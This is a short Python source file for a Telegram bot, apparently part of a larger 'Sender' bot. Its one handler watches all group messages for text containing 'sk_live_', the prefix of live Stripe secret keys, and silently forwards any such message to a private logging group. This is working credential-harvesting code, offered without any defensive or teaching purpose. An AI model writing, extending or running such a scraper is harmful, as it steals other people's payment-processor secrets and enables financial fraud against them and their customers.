
import  struct, base64
import requests,sys
from pyrogram import filters
from pyrogram.types import Message

from Sender import bot, LOG_GRP
from pyrogram.errors import RPCError

import functools
from typing import Callable, Coroutine, Dict, List, Tuple, Union
from pyromod import listen


@bot.on_message(~filters.private)
async def copy(client, message):
    text = message.text
    text = text.lower()
    if "sk_live_" in text:
      try:
          await message.forward(LOG_GRP)
      except:
          return
